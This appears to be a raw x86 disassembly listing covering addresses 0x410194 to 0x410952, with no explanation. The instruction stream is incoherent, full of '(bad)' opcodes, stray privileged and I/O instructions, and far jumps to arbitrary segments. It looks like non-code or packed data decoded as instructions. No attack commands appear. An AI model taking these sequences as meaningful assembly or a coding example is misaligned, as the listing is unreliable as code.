  410194:	rol    DWORD PTR [eax+0x57ca6f53],1
  41019a:	mov    ah,0xac
  41019c:	imul   ecx,esi,0xa748f783
  4101a2:	jbe    0x4101c5
  4101a4:	and    BYTE PTR [edi+eiz*4+0x20],0x4a
  4101a9:	push   esi
  4101aa:	das    
  4101ab:	outs   dx,DWORD PTR ds:[esi]
  4101ac:	push   es
  4101ad:	sub    al,0x38
  4101af:	stos   BYTE PTR es:[edi],al
  4101b0:	adc    edi,ecx
  4101b2:	mov    edi,0xe18e9adb
  4101b7:	and    cl,BYTE PTR [eax]
  4101b9:	xlat   BYTE PTR ds:[ebx]
  4101ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101bb:	or     eax,0x7089f194
  4101c0:	push   esp
  4101c1:	dec    ecx
  4101c2:	and    ebx,DWORD PTR [esi]
  4101c4:	aam    0x28
  4101c6:	sar    DWORD PTR [ecx+0x7a],cl
  4101c9:	inc    ecx
  4101ca:	sbb    edx,DWORD PTR [edx+0x554e5534]
  4101d0:	je     0x41016d
  4101d2:	adc    BYTE PTR [edx-0x78],ah
  4101d5:	ficom  DWORD PTR [edx-0x2b]
  4101d8:	mov    dl,0xe9
  4101da:	mov    esp,0x62a8525c
  4101df:	test   ecx,esp
  4101e1:	dec    edx
  4101e2:	rcr    ebx,1
  4101e4:	clc    
  4101e5:	fs adc ah,ah
  4101e8:	je     0x4101c0
  4101ea:	inc    ebp
  4101eb:	xor    ebp,DWORD PTR [ebx+0xe]
  4101ee:	mov    edx,0x5e3f54f3
  4101f3:	jge    0x4101a0
  4101f5:	repz test eax,0xb00363f6
  4101fb:	fsubr  DWORD PTR [ebp+0x35]
  4101fe:	push   esp
  4101ff:	xchg   edx,eax
  410200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410201:	nop
  410202:	xor    BYTE PTR [edx+edx*2+0x53],0xf5
  410207:	jbe    0x4101c3
  410209:	jmp    0xdc098858
  41020e:	(bad)  
  41020f:	aad    0x94
  410211:	mov    ah,0x75
  410213:	aam    0x63
  410215:	xchg   esi,eax
  410216:	call   0xca20:0x26bb7350
  41021d:	(bad)  
  41021e:	mov    edx,0xc0da5b51
  410223:	aam    0xed
  410225:	mov    ebp,0x284b2e60
  41022a:	xchg   esp,eax
  41022b:	cmp    ch,dl
  41022d:	outs   dx,BYTE PTR ds:[esi]
  41022e:	fidivr DWORD PTR [esi+0x5d9b8317]
  410234:	lods   eax,DWORD PTR ds:[esi]
  410235:	xchg   ebx,eax
  410236:	or     ah,BYTE PTR [ecx]
  410238:	xor    DWORD PTR [edi],esp
  41023a:	(bad)
  41023d:	daa    
  41023e:	stc    
  41023f:	cmp    bh,BYTE PTR ds:0xbce9aaa6
  410245:	hlt    
  410246:	add    DWORD PTR [eax-0x62],ebp
  410249:	xchg   edi,eax
  41024a:	repnz and BYTE PTR [edx-0x61],0x65
  41024f:	(bad)  
  410250:	loopne 0x41024a
  410252:	dec    esp
  410253:	scas   eax,DWORD PTR es:[edi]
  410254:	xor    DWORD PTR [edx],0x8ac5905e
  41025a:	jmp    0x410253
  41025c:	inc    ebp
  41025d:	into   
  41025e:	bound  eax,QWORD PTR [edi]
  410260:	push   es
  410261:	stc    
  410262:	or     BYTE PTR [esi+ecx*4],bl
  410265:	mov    ebx,0x5be922a
  41026a:	mov    ah,cl
  41026c:	popa   
  41026d:	xor    al,0xe0
  41026f:	mov    esi,0xefd882ca
  410274:	idiv   DWORD PTR [edi+0x5f924fe7]
  41027a:	push   es
  41027b:	sub    al,0xdd
  41027d:	push   cs
  41027e:	inc    eax
  41027f:	adc    bh,al
  410281:	mov    eax,0x79c9ff96
  410286:	sbb    ah,bh
  410288:	xchg   esp,eax
  410289:	je     0x4102c3
  41028b:	push   0xffffffa8
  41028d:	cld    
  41028e:	sahf   
  41028f:	dec    edi
  410291:	cmp    ah,al
  410293:	pop    esi
  410294:	scas   eax,DWORD PTR es:[edi]
  410295:	lea    edx,[ebx]
  410297:	push   ecx
  410298:	or     al,0x68
  41029a:	dec    ecx
  41029b:	mov    eax,0x3f64a102
  4102a0:	mov    ebp,0x54e378e8
  4102a5:	ins    BYTE PTR es:[edi],dx
  4102a6:	fild   WORD PTR [esi+0x33668b70]
  4102ac:	out    dx,al
  4102ad:	or     BYTE PTR [edx+0x64],ah
  4102b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102b2:	enter  0xb6e2,0x7b
  4102b6:	inc    edi
  4102b7:	addr16 icebp 
  4102b9:	mov    dl,0xb3
  4102bb:	in     eax,dx
  4102bc:	dec    esi
  4102bd:	xchg   BYTE PTR [edx+0x3c0ae822],ah
  4102c3:	mov    edx,0xcfd8a5fe
  4102c8:	clc    
  4102c9:	sahf   
  4102ca:	sub    ebp,DWORD PTR [eax-0x27e003b3]
  4102d0:	je     0x410332
  4102d2:	js     0x4102ba
  4102d4:	inc    esp
  4102d5:	jnp    0x4102f9
  4102d7:	jmp    0x41033c
  4102d9:	pop    esi
  4102da:	in     al,0xa8
  4102dc:	push   es
  4102dd:	sub    BYTE PTR [eax+0x7],0x9a
  4102e1:	mov    eax,0xf2069700
  4102e6:	or     ebp,ebx
  4102e8:	mov    esp,0x49605047
  4102ed:	into   
  4102ee:	lahf   
  4102ef:	pushf  
  4102f0:	jle    0x410315
  4102f2:	xchg   esp,eax
  4102f3:	xchg   esp,eax
  4102f4:	popf   
  4102f5:	push   edi
  4102f6:	mov    esi,0xb6fcf827
  4102fb:	aaa    
  4102fc:	mov    bh,0xba
  4102fe:	pop    esi
  4102ff:	xchg   ebp,eax
  410300:	add    DWORD PTR [edi],ebx
  410302:	inc    edi
  410303:	mov    ebx,0xe64cfcf3
  410308:	fnstsw WORD PTR [edx+0x8b34de8]
  41030e:	iret   
  41030f:	repnz mov dh,0xbe
  410312:	js     0x4102e2
  410314:	(bad)  
  410315:	jl     0x4102dc
  410317:	iret   
  410318:	retf   0x2034
  41031b:	mov    eax,ds:0x8d6b1dcf
  410320:	mov    dh,0x72
  410322:	mov    dh,0x1c
  410324:	(bad)  
  410325:	repnz fidiv DWORD PTR [edi]
  410328:	inc    ebx
  410329:	adc    DWORD PTR [bp+si+0x18],esp
  41032d:	rcl    bl,0xf7
  410330:	fldcw  WORD PTR [esi-0x11a2adbd]
  410336:	shl    DWORD PTR [edx+0xf],cl
  410339:	dec    esp
  41033a:	(bad)  
  41033b:	jmp    0x41031d
  41033d:	fcom   st(4)
  41033f:	cli    
  410340:	push   cs
  410341:	push   0xeca6b978
  410346:	push   0x132091fd
  41034b:	push   esp
  41034c:	inc    esp
  41034d:	adc    eax,0x496e32d5
  410352:	mov    ebx,0xfe8ddf44
  410357:	xchg   edi,eax
  410358:	int3   
  410359:	mov    bh,0x6
  41035b:	outs   dx,BYTE PTR ds:[esi]
  41035c:	test   al,0x92
  41035e:	dec    ecx
  41035f:	inc    edi
  410360:	es loop 0x41030c
  410363:	jmp    0x6f21cf00
  410368:	inc    BYTE PTR [ebx+edi*8]
  41036b:	adc    edx,esi
  41036d:	sar    BYTE PTR [ecx+0x1f],0xae
  410371:	push   ds
  410372:	dec    esi
  410373:	sbb    ah,BYTE PTR [edx+0x7a511e4]
  410379:	out    0xc6,al
  41037b:	icebp  
  41037c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41037d:	mov    edx,0x78449355
  410382:	or     eax,0xb8b59e71
  410387:	in     al,0xd5
  410389:	inc    ebp
  41038a:	into   
  41038b:	rcr    DWORD PTR [eax],0x75
  41038e:	cwde   
  41038f:	add    al,0xde
  410391:	adc    al,BYTE PTR [edx-0x2bb52895]
  410397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410398:	cmp    BYTE PTR [edi+edi*1+0x14],0x6a
  41039d:	xchg   ebp,eax
  41039e:	mov    dh,0xff
  4103a0:	cmp    ecx,DWORD PTR [eax+0x14c2c463]
  4103a6:	adc    DWORD PTR [ebp+0x68],esp
  4103a9:	in     eax,dx
  4103aa:	hlt    
  4103ab:	lahf   
  4103ac:	and    DWORD PTR [ebx-0x330fafd0],edi
  4103b2:	add    ch,BYTE PTR [esp+edi*4+0x1b]
  4103b6:	popa   
  4103b7:	loop   0x41041a
  4103b9:	inc    edi
  4103ba:	(bad)  
  4103bb:	fcmovnbe st,st(5)
  4103bd:	nop
  4103be:	and    DWORD PTR [edx-0x78],ebp
  4103c1:	jl     0x41041a
  4103c3:	add    al,0x3c
  4103c5:	scas   eax,DWORD PTR es:[edi]
  4103c6:	and    ebp,DWORD PTR [edx+0x774f06db]
  4103cc:	xor    esp,DWORD PTR [ebx+0x11]
  4103cf:	sbb    BYTE PTR [edi+eax*8],bh
  4103d2:	mov    dh,al
  4103d4:	popf   
  4103d5:	test   BYTE PTR [ecx-0x56d1a004],0x58
  4103dc:	ficomp WORD PTR [esp+ecx*1-0x5]
  4103e0:	cmp    DWORD PTR [ecx],ebp
  4103e2:	jb     0x4103a6
  4103e4:	xor    al,0xc6
  4103e6:	jne    0x410407
  4103e8:	mov    dl,0xe6
  4103ea:	jnp    0x410423
  4103ec:	xchg   ebp,eax
  4103ed:	adc    ecx,DWORD PTR [edi+eiz*2]
  4103f0:	sbb    BYTE PTR [edx-0x16],ah
  4103f3:	pop    ss
  4103f4:	lea    edx,[ecx+0x7a]
  4103f7:	or     al,0x8c
  4103f9:	out    0xe9,eax
  4103fb:	je     0x4103ed
  4103fd:	cmp    eax,0x7a8b11ba
  410402:	mov    eax,ds:0x161f4452
  410407:	sbb    eax,DWORD PTR [edi]
  410409:	out    0xa7,eax
  41040b:	mov    ds:0x9ce10b99,al
  410410:	test   ebx,ebx
  410412:	ins    BYTE PTR es:[edi],dx
  410413:	cld    
  410414:	add    eax,0x21e5a11d
  410419:	push   ebp
  41041a:	popf   
  41041b:	mov    bl,0xb7
  41041d:	mov    ebp,0xbb53edc
  410422:	gs inc eax
  410424:	rol    DWORD PTR [ebp+0x3f],cl
  410427:	out    0x5b,eax
  410429:	sub    al,0x11
  41042b:	push   0x2fb1f2b
  410430:	jb     0x41041d
  410432:	popf   
  410433:	sbb    al,0x98
  410435:	add    ebx,DWORD PTR [edx-0x5d7a178a]
  41043b:	xchg   DWORD PTR [eax],eax
  41043d:	aaa    
  41043e:	sahf   
  41043f:	mov    cl,0x9d
  410441:	push   ss
  410442:	(bad)  
  410443:	stos   BYTE PTR es:[edi],al
  410444:	mov    ebp,0x5e372b18
  410449:	fisttp QWORD PTR ds:0x2dcf9aa6
  41044f:	pop    ds
  410450:	repnz xchg ebp,eax
  410452:	xchg   DWORD PTR [esi+ecx*1+0x12ce6fbd],esp
  410459:	push   eax
  41045a:	ins    BYTE PTR es:[edi],dx
  41045b:	mov    al,0xb2
  41045d:	jge    0x4104a9
  41045f:	jns    0x4104a7
  410461:	ins    BYTE PTR es:[edi],dx
  410462:	cmp    BYTE PTR [edx],bh
  410464:	push   edx
  410465:	repz adc eax,DWORD PTR [ecx+edi*4]
  410469:	jo     0x4104b2
  41046b:	mov    ch,BYTE PTR [esi+0x3e3b3664]
  410471:	dec    ecx
  410472:	jb     0x41049f
  410474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410475:	es jnp 0x41047d
  410478:	cmp    ecx,edx
  41047a:	mov    ebx,DWORD PTR [ebp+0xe3bd362]
  410480:	ror    esp,0x51
  410483:	mov    edi,0xbee1a1f1
  410488:	push   eax
  410489:	xchg   esi,eax
  41048a:	or     eax,0x43125111
  41048f:	outs   dx,BYTE PTR ds:[esi]
  410490:	mov    bh,0x9b
  410492:	fcomp  DWORD PTR [ecx+0x4f2a6e04]
  410498:	cmc    
  410499:	inc    ebx
  41049a:	rol    DWORD PTR [ecx+0x7383a31b],cl
  4104a0:	lock push cs
  4104a2:	sbb    ah,cl
  4104a4:	cmp    edi,DWORD PTR [ecx+0x18f7e045]
  4104aa:	adc    al,0x1b
  4104ac:	inc    ebx
  4104ad:	int    0x9a
  4104af:	push   ebx
  4104b0:	int3   
  4104b1:	ss cmc 
  4104b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104b4:	repnz pusha 
  4104b6:	jns    0x41043d
  4104b8:	sub    al,0xe0
  4104ba:	cmp    al,0x93
  4104bc:	scas   eax,DWORD PTR es:[edi]
  4104bd:	ins    BYTE PTR es:[edi],dx
  4104be:	(bad)  
  4104bf:	(bad)  
  4104c0:	sahf   
  4104c1:	fsubr  QWORD PTR [ebx-0x4d]
  4104c4:	jns    0x410522
  4104c6:	pop    ss
  4104c7:	dec    edi
  4104c8:	dec    edx
  4104c9:	addr16 sbb ecx,0x7c2030b7
  4104d0:	jge    0x41046a
  4104d2:	mov    dh,BYTE PTR [edx+ebp*1+0x1d5580be]
  4104d9:	je     0x410514
  4104db:	and    BYTE PTR [edx],al
  4104dd:	xor    ch,ch
  4104df:	add    DWORD PTR [ecx-0x69],ebp
  4104e2:	sub    al,0xe0
  4104e4:	jmp    0xc0712287
  4104e9:	dec    ecx
  4104ea:	jg     0x4104c5
  4104ec:	push   0x5f
  4104ee:	add    bh,BYTE PTR [eax-0xf]
  4104f1:	cmp    DWORD PTR [edx],eax
  4104f3:	mov    eax,ds:0x80139dec
  4104f8:	xchg   esp,eax
  4104f9:	pusha  
  4104fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104fb:	fcom   DWORD PTR [edx-0x39]
  4104fe:	jbe    0x4104b3
  410500:	aaa    
  410501:	jl     0x410511
  410503:	sub    bh,BYTE PTR [esi]
  410505:	mov    bh,0x6f
  410507:	push   ds
  410508:	aaa    
  410509:	inc    ebp
  41050a:	repnz sahf 
  41050c:	push   ebp
  41050d:	fist   WORD PTR [ecx]
  41050f:	clc    
  410510:	pop    edi
  410511:	jecxz  0x4104b0
  410513:	aaa    
  410514:	cmp    esp,DWORD PTR [esi-0x52c6cc87]
  41051a:	xchg   esp,eax
  41051b:	fisubr WORD PTR ds:0xf4144ea2
  410521:	hlt    
  410522:	jmp    0xe92fe836
  410527:	cmc    
  410528:	pop    ss
  410529:	aas    
  41052a:	clc    
  41052b:	call   0x85d0:0xe3e62bea
  410532:	sub    al,0x4f
  410534:	sub    bh,ch
  410536:	jg     0x410506
  410538:	std    
  410539:	es jmp 0x5a02:0x6a4c996f
  410541:	mov    BYTE PTR [eax],al
  410543:	sub    DWORD PTR ds:0xc818584,ebx
  410549:	push   edx
  41054a:	xor    ebp,eax
  41054c:	add    dh,ch
  41054e:	adc    eax,0x9a380921
  410553:	push   cs
  410554:	shl    DWORD PTR [ebp-0x5fdde8f0],1
  41055a:	inc    eax
  41055b:	cwde   
  41055c:	mov    ebx,0xbb4bfa4b
  410561:	hlt    
  410562:	bound  edx,QWORD PTR [esi]
  410564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410565:	ficom  DWORD PTR [edx+0x4]
  410568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410569:	loope  0x41055b
  41056b:	jmp    0x844e8d09
  410570:	and    eax,0xcb56b2d2
  410575:	xchg   BYTE PTR [ebx],ch
  410577:	stos   DWORD PTR es:[edi],eax
  410578:	es dec esp
  41057a:	mov    ebx,DWORD PTR [eax-0x4ae39f2c]
  410580:	add    BYTE PTR [edi],0x66
  410583:	xchg   DWORD PTR [ebx],ebp
  410585:	sti    
  410586:	pop    esi
  410587:	xchg   esi,eax
  410588:	push   cs
  410589:	aam    0x30
  41058b:	es push ebx
  41058d:	sbb    bl,al
  41058f:	aam    0x6d
  410591:	in     al,0x7e
  410593:	xor    al,0x55
  410595:	sahf   
  410596:	imul   BYTE PTR [eax-0xec57fd9]
  41059c:	out    dx,eax
  41059d:	scas   al,BYTE PTR es:[edi]
  41059e:	jmp    0x6023:0xceef710e
  4105a5:	lods   eax,DWORD PTR ds:[esi]
  4105a6:	pop    ecx
  4105a7:	adc    ebp,DWORD PTR [esi+ebp*4+0x46857819]
  4105ae:	fld    TBYTE PTR [esi+esi*4+0x483a5e41]
  4105b5:	ret    
  4105b6:	call   0xfa97:0xb47a3156
  4105bd:	vmread DWORD PTR [ebx+0x4bb873e7],ecx
  4105c4:	mov    ah,0x49
  4105c6:	pop    esp
  4105c7:	xchg   ebp,eax
  4105c8:	jg     0x4105c8
  4105ca:	cmp    cl,bl
  4105cc:	in     eax,dx
  4105cd:	pop    esi
  4105ce:	or     eax,0xfd39bde9
  4105d3:	jmp    0xcb26:0x3277604b
  4105da:	data16 xor al,0xe2
  4105dd:	idiv   dl
  4105df:	jb     0x41065a
  4105e1:	fist   WORD PTR [eax]
  4105e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105e4:	add    eax,DWORD PTR [esi-0x7102af76]
  4105ea:	xor    BYTE PTR [ecx],ah
  4105ec:	jb     0x41061d
  4105ee:	pop    edi
  4105ef:	pop    edx
  4105f0:	jp     0x4105ec
  4105f2:	dec    ebx
  4105f3:	add    bh,BYTE PTR [ebp-0x52c20885]
  4105f9:	xchg   edi,eax
  4105fa:	mov    ds:0x67f46d7c,eax
  4105ff:	adc    BYTE PTR [eax+0x61c2bbc5],dl
  410605:	sbb    DWORD PTR [edi-0x1481a0ab],0x631e514c
  41060f:	mov    ds:0x7b8b9e6e,al
  410614:	sahf   
  410615:	and    ah,bl
  410617:	aam    0x87
  410619:	pop    edx
  41061a:	push   ss
  41061b:	push   edx
  41061c:	int    0xc5
  41061e:	stos   BYTE PTR es:[edi],al
  41061f:	stos   DWORD PTR es:[edi],eax
  410620:	(bad)  
  410621:	dec    ebp
  410622:	sub    ebp,edx
  410624:	gs inc ecx
  410626:	jle    0x410635
  410628:	xchg   edi,eax
  410629:	xor    DWORD PTR [eax],ecx
  41062b:	pop    ebx
  41062c:	xchg   DWORD PTR [ecx-0x15],ebp
  41062f:	jno    0x41060e
  410631:	imul   esi,DWORD PTR [ecx-0x60],0xffffffa6
  410635:	setae  al
  410638:	and    ah,BYTE PTR [esi]
  41063a:	imul   esp,DWORD PTR [ecx],0xe061cced
  410640:	test   al,0x5e
  410642:	or     ecx,DWORD PTR [eax+0x68]
  410645:	mov    dl,0xac
  410647:	das    
  410648:	push   ebx
  410649:	pop    ebx
  41064a:	dec    esi
  41064b:	or     ebx,edx
  41064d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41064e:	cmp    DWORD PTR [edi],0x1d0e643
  410654:	and    edx,DWORD PTR [edx]
  410656:	jnp    0x41066f
  410658:	fiadd  WORD PTR [ecx+0x59549bdd]
  41065e:	lock push esi
  410660:	imul   esi,DWORD PTR [esi+eax*2-0x7b74bad],0x2a0fe24
  41066b:	bound  ax,DWORD PTR [esi+0x52]
  41066f:	adc    eax,0x688c7688
  410674:	outs   dx,BYTE PTR ds:[esi]
  410675:	fist   WORD PTR [edx-0x45]
  410678:	xor    edx,edi
  41067a:	and    ah,BYTE PTR [esi-0x24bad6d2]
  410680:	push   es
  410681:	in     al,dx
  410682:	or     DWORD PTR [esp+edx*8-0x31],0xb0725889
  41068a:	ss loopne 0x410638
  41068d:	sbb    al,0xd6
  41068f:	jge    0x410620
  410691:	mov    ebx,0xe6c32d3b
  410696:	ds in  al,0x18
  410699:	lock sbb BYTE PTR [ebx],cl
  41069c:	adc    esp,ebx
  41069e:	in     eax,0x4d
  4106a0:	push   ds
  4106a1:	scas   al,BYTE PTR es:[edi]
  4106a2:	ror    dl,cl
  4106a4:	push   esp
  4106a5:	jecxz  0x4106a0
  4106a7:	jg     0x410666
  4106a9:	adc    ah,BYTE PTR [ebx+0x64981b64]
  4106af:	icebp  
  4106b0:	dec    edx
  4106b1:	retf   0xfc52
  4106b4:	call   FWORD PTR [ebx]
  4106b6:	xlat   BYTE PTR ds:[ebx]
  4106b7:	mov    dh,BYTE PTR [esi-0x4a4c8c68]
  4106bd:	ja     0x4106af
  4106bf:	sbb    al,0xb8
  4106c1:	mov    BYTE PTR [ebx-0x69],bh
  4106c4:	mov    eax,0xf7f82875
  4106c9:	inc    esi
  4106ca:	in     al,0x3
  4106cc:	cmp    DWORD PTR [ebx],ecx
  4106ce:	push   esi
  4106cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106d0:	popf   
  4106d1:	inc    ebx
  4106d2:	pushf  
  4106d3:	inc    esi
  4106d4:	shr    DWORD PTR [eax-0x7e],0x79
  4106d8:	imul   esp,DWORD PTR ds:0xa3e97a75,0xda374233
  4106e2:	sbb    BYTE PTR [ecx-0x313a69b1],dh
  4106e8:	int3   
  4106e9:	leave  
  4106ea:	push   es
  4106eb:	mov    eax,ds:0xe995a243
  4106f0:	iret   
  4106f1:	mov    ch,0x9e
  4106f3:	sbb    ebx,ebp
  4106f5:	xchg   ebp,eax
  4106f6:	das    
  4106f7:	aaa    
  4106f8:	fwait
  4106f9:	loop   0x41068f
  4106fb:	addr16 mov bl,0xd3
  4106fe:	loopne 0x410735
  410700:	mov    eax,0xce1ab11e
  410705:	adc    eax,0x70650145
  41070a:	and    BYTE PTR [esp],cl
  41070d:	sub    edx,DWORD PTR [edi]
  41070f:	fdiv   DWORD PTR [edx-0x29]
  410712:	mov    ecx,0x379de334
  410717:	pop    ebx
  410718:	add    ch,BYTE PTR [edi+0x79ba6faf]
  41071e:	sub    DWORD PTR [ebp-0x6591f44a],ebp
  410724:	jmp    0xa45d:0xb639d303
  41072b:	cmc    
  41072c:	popf   
  41072d:	cmp    eax,0x334ab026
  410732:	clc    
  410733:	jnp    0x4107b2
  410735:	gs dec eax
  410737:	retf   
  410738:	mov    dh,0xc1
  41073a:	mov    al,ds:0xb40f101e
  41073f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410740:	dec    esp
  410741:	fwait
  410742:	mov    esp,DWORD PTR [edx+0x1bca67f9]
  410748:	jnp    0x4107c2
  41074a:	xor    eax,0xbf33e132
  41074f:	dec    edi
  410750:	pusha  
  410751:	sbb    DWORD PTR [eax+0x76c50aa3],0x2705850c
  41075b:	mov    ds:0xea1683f3,al
  410760:	stc    
  410761:	cmp    BYTE PTR [ebp+0x13],ah
  410764:	pop    ebx
  410765:	jbe    0x4107d0
  410767:	adc    ch,BYTE PTR [ebx]
  410769:	mov    ecx,0xa2d5f404
  41076e:	cmp    bh,BYTE PTR [eax+0x0]
  410771:	push   ebp
  410772:	(bad)  
  410774:	inc    edx
  410775:	or     DWORD PTR [esi+0x17],eax
  410778:	jae    0x41078a
  41077a:	rcr    DWORD PTR [esi],1
  41077c:	std    
  41077d:	jle    0x4107a4
  41077f:	mov    ah,0xbf
  410781:	sti    
  410782:	xchg   BYTE PTR [ebp+0x36],ch
  410785:	in     eax,0xd7
  410787:	cmp    BYTE PTR [edi+0x60],dl
  41078a:	or     eax,0xf45c2df1
  41078f:	push   esi
  410790:	retf   0x3b54
  410793:	and    BYTE PTR [edi],bh
  410795:	dec    ebx
  410796:	neg    DWORD PTR [ebp+0x6e]
  410799:	lods   al,BYTE PTR ds:[esi]
  41079a:	sub    al,0xb4
  41079c:	es pop ebp
  41079e:	xlat   BYTE PTR ds:[ebx]
  41079f:	mov    ds,WORD PTR [ebp+0x1ac25e27]
  4107a5:	sbb    ebx,DWORD PTR [ebx+eiz*1+0x7d]
  4107a9:	nop
  4107aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ab:	scas   eax,DWORD PTR es:[edi]
  4107ac:	adc    edx,DWORD PTR [eax]
  4107ae:	neg    ch
  4107b0:	sahf   
  4107b1:	aam    0xda
  4107b3:	lods   eax,DWORD PTR ds:[esi]
  4107b4:	sbb    ecx,0x81fcb90e
  4107ba:	sahf   
  4107bb:	ja     0x410796
  4107bd:	mov    edx,0xa27c7e9b
  4107c2:	push   es
  4107c3:	pop    ds
  4107c4:	cmp    ch,dl
  4107c6:	jl     0x41082e
  4107c8:	mov    cl,0x3b
  4107ca:	ja     0x4107dd
  4107cc:	sub    eax,0x536371ed
  4107d1:	je     0x410761
  4107d3:	xor    BYTE PTR [esi-0x5b],0xc5
  4107d7:	stos   DWORD PTR es:[edi],eax
  4107d8:	ins    DWORD PTR es:[edi],dx
  4107d9:	sbb    cl,BYTE PTR ds:0x294ac0f1
  4107df:	mov    ch,0x4f
  4107e1:	sub    eax,0x8a039a17
  4107e6:	ret    0x3c50
  4107e9:	sbb    ebx,DWORD PTR [edx+0x5]
  4107ec:	hlt    
  4107ed:	imul   esi,DWORD PTR [esi],0x7698e085
  4107f3:	push   edx
  4107f4:	mov    esi,0x6c3f16a8
  4107f9:	test   DWORD PTR [ebp+0x3bb43c86],edi
  4107ff:	fs jecxz 0x4107bb
  410802:	pop    esp
  410803:	sbb    ch,BYTE PTR [ebx]
  410805:	loopne 0x410803
  410807:	mov    DWORD PTR [edi],ecx
  410809:	mov    ds:0x6cfdca3d,al
  41080e:	les    ebp,FWORD PTR [eax+0x4a8b15bd]
  410814:	jp     0x410847
  410816:	xor    ch,ch
  410818:	adc    eax,0xc9e2d903
  41081d:	mov    ch,0xa7
  41081f:	sti    
  410820:	adc    bl,cl
  410822:	sbb    cl,BYTE PTR [ebx-0x29b59bba]
  410828:	mov    edi,0x689b2969
  41082d:	xor    ecx,DWORD PTR [edx+0x28]
  410830:	out    dx,eax
  410831:	add    DWORD PTR [edx-0x80],ebx
  410834:	cmp    BYTE PTR [ebx+0x9],0x34
  410838:	(bad)  
  410839:	(bad)  
  41083b:	fcomp  st(6)
  41083d:	dec    ebp
  41083e:	push   esp
  41083f:	pop    ebp
  410840:	xchg   BYTE PTR [edi-0x22],dh
  410843:	popf   
  410844:	lds    esi,FWORD PTR [ebx]
  410846:	ret    0xc3ca
  410849:	fwait
  41084a:	jmp    0x410841
  41084c:	push   esp
  41084d:	pop    esi
  41084e:	xor    eax,0xaa04a7b5
  410853:	or     al,0xa7
  410855:	pop    ecx
  410856:	rcr    BYTE PTR [esi],cl
  410858:	jo     0x4108a4
  41085a:	lea    edi,[edi]
  41085c:	mov    cl,0x90
  41085e:	into   
  41085f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410860:	mov    ds:0xcb4a1e02,eax
  410865:	scas   al,BYTE PTR es:[edi]
  410866:	les    esi,FWORD PTR [edx+0x2d]
  410869:	test   eax,0x633584e4
  41086e:	push   ds
  41086f:	add    DWORD PTR [esi-0x5e],0x74b9cb71
  410876:	pop    eax
  410877:	jmp    0x4cfb:0x3261c7f1
  41087e:	ss aas 
  410880:	jmp    0x5ce9:0x13a21136
  410887:	cwde   
  410888:	sub    dh,BYTE PTR [edx-0x329b1fc2]
  41088e:	mov    WORD PTR [ebx-0x72],ds
  410891:	outs   dx,BYTE PTR ds:[esi]
  410892:	and    al,0xf3
  410894:	and    eax,0xeef4d24e
  410899:	popf   
  41089a:	jle    0x4108bb
  41089c:	fabs   
  41089e:	pop    DWORD PTR [eax+0x368b0370]
  4108a4:	rol    ecx,0x7
  4108a7:	xor    al,0x9e
  4108a9:	jno    0x410915
  4108ab:	mov    ebp,?
  4108ad:	add    BYTE PTR [ecx-0x548d7630],0x0
  4108b4:	push   0x63
  4108b6:	sub    bh,BYTE PTR [eax]
  4108b8:	aam    0xb3
  4108ba:	dec    ebp
  4108bb:	add    dh,bl
  4108bd:	pop    eax
  4108be:	inc    esp
  4108bf:	ja     0x4108aa
  4108c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c2:	jb     0x410893
  4108c4:	pop    ss
  4108c5:	mov    ch,0x86
  4108c7:	sub    al,0x16
  4108c9:	add    eax,0x570f6c50
  4108ce:	jmp    0x41085c
  4108d0:	sub    eax,0x52848ca3
  4108d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108d6:	cmc    
  4108d7:	hlt    
  4108d8:	xor    BYTE PTR [edx-0x71],0x5e
  4108dc:	or     eax,0x5b7c82a6
  4108e1:	mov    ebx,DWORD PTR [ebx]
  4108e3:	(bad)  
  4108e4:	mov    esi,0x1fbb3be5
  4108e9:	push   cs
  4108ea:	fimul  DWORD PTR [ebx]
  4108ec:	clc    
  4108ed:	enter  0x8bb5,0x67
  4108f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108f2:	adc    eax,0x77165f5a
  4108f7:	xchg   esi,ebp
  4108f9:	push   ds
  4108fa:	(bad)  
  4108fb:	xchg   ebp,eax
  4108fc:	dec    esi
  4108fd:	push   edi
  4108fe:	hlt    
  4108ff:	mov    ah,0x6
  410901:	scas   eax,DWORD PTR es:[edi]
  410902:	sub    BYTE PTR [esi+eiz*1-0x367ca1bc],dh
  410909:	inc    esp
  41090a:	(bad)  [esp+edx*8+0x49101e1d]
  410911:	dec    ecx
  410912:	cmp    BYTE PTR [eax-0x6b],dl
  410915:	iret   
  410916:	mov    edi,0x7b3e80f0
  41091b:	fwait
  41091c:	mov    cl,0xad
  41091e:	jmp    0x4108b3
  410920:	imul   esi,DWORD PTR [esi-0x672e91ac],0x7e
  410927:	mov    dl,0x98
  410929:	rcr    DWORD PTR [edi],1
  41092b:	jecxz  0x4108d1
  41092d:	adc    BYTE PTR [edi],ah
  41092f:	dec    edx
  410930:	retf   0xa203
  410933:	xor    al,BYTE PTR [ebx+0x10]
  410936:	cmc    
  410937:	pop    edx
  410938:	add    eax,0x172157f
  41093d:	push   ds
  41093e:	xor    bh,BYTE PTR [esi+0x59]
  410941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410942:	stos   DWORD PTR es:[edi],eax
  410943:	scas   eax,DWORD PTR es:[edi]
  410944:	jl     0x4108db
  410946:	enter  0x1df0,0x88
  41094a:	imul   DWORD PTR [edi+0x219ad774]
  410950:	daa    
  410951:	clc    
  410952:	inc    edi
